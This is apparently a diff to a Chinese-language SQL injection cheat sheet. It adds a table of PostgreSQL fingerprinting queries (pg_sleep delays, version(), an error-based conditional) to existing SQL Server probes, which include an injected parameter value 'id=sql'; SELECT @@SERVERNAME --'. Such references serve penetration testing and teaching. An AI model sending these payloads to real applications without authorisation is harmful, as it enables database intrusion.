@@ -122,3 +122,12 @@ SQL Server识别：
 |默认变量|id=sql'; SELECT @@SERVERNAME --|
 |错误信息|id='<br>id=@@SERVERNAME<br>id=0/@@SERVERNAME|
 |比较函数|BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)<br>@@CONNECTIONS>0<br>@@CONNECTIONS=@@CONNECTIONS|
+
+PostgreSQL识别：
+|描述|查询语句|
+|----|----|
+|睡眠|SELECT pg_sleep(10)|
+|字符串拼接|'foo'\|\|'bar'|
+|默认变量|SELECT version()|
+|错误信息|1 = (select case when (条件语句) then 1/(select 0) else null end)|
+|比较函数|pg_client_encoding()=pg_client_encoding()<br>get_current_ts_config()=get_current_ts_config()<br>quote_literal(42.5)=quote_literal(42.5)<br>current_database()=current_database()|
